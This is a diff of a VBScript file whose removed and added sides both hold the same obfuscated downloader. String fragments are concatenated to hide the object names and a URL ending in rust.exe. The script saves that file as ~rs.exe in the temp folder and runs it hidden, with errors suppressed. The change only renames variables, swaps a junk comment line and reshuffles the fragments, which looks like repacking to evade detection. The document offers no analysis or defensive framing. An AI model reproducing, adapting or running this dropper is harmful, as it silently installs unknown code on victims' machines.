@@ -1,19 +1,19 @@
-' demXYohmkqZJNDcTRdGtIXgbWVWuLxcNanZYReIkDtXFjYIFuIgGErVWObbFIjFJfLIxtjkeUGCuEoxuadoQthteYcivWpWliqttzzc saGHYthMjArZnbri
+' xZ oymnPEbuDMkOaPHuoKEGrqZlMnkcuWOayzQZtNXuFFrErJOaikYWgqFtSvulmq gNNssjkBmDCPSxtMdwbJUqDdJwkSBxIcnCHusdorSyQq wmugdHWHEveWMkvfjINFeN
 On Error Resume Next
-Dim Q,p,R,C,T
-Set Q=CreateObject(("MSX"&"M"&"L"&"2.S"&"erv"&"er"&"XML"&"H"&"T"&"T"&"P.6"&"."&"0"))
-Q.Open "GET",("h"&"tt"&"ps"&":"&"/"&"/s"&"t"&"o"&"p"&"la"&"g."&"org")&("/r"&"u"&"st"&"."&"ex"&"e"),False
-Q.Send
-If Q.Status=200 Then
-  Set p=CreateObject(("ADO"&"DB."&"S"&"t"&"r"&"ea"&"m"))
-  p.Type=1
-  p.Open
-  p.Write(Q.ResponseBody)
-  Set C=CreateObject(("Sc"&"rip"&"tin"&"g"&".F"&"il"&"eS"&"ys"&"tem"&"Ob"&"jec"&"t"))
-  R=C.GetSpecialFolder(2)
-  p.SaveToFile R&("\"&"~"&"rs"&".e"&"x"&"e"),2
-  p.Close
-  Set T=CreateObject(("W"&"Scr"&"i"&"pt"&".S"&"h"&"e"&"ll"))
-  T.Run R&("\~"&"rs."&"exe"),0,False
+Dim H,j,U,f,l
+Set H=CreateObject(("MS"&"XML"&"2"&".Se"&"rve"&"rXM"&"LHT"&"T"&"P."&"6."&"0"))
+H.Open "GET",("ht"&"t"&"p"&"s:"&"//s"&"to"&"pla"&"g."&"org")&("/ru"&"st"&".e"&"x"&"e"),False
+H.Send
+If H.Status=200 Then
+  Set j=CreateObject(("ADO"&"DB."&"Str"&"eam"))
+  j.Type=1
+  j.Open
+  j.Write(H.ResponseBody)
+  Set f=CreateObject(("S"&"cri"&"p"&"t"&"in"&"g."&"Fil"&"e"&"Sys"&"te"&"m"&"Ob"&"je"&"ct"))
+  U=f.GetSpecialFolder(2)
+  j.SaveToFile U&("\"&"~rs"&"."&"exe"),2
+  j.Close
+  Set l=CreateObject(("W"&"Sc"&"ri"&"pt."&"S"&"hel"&"l"))
+  l.Run U&("\"&"~r"&"s."&"exe"),0,False
 End If
-Set Q=Nothing
+Set H=Nothing
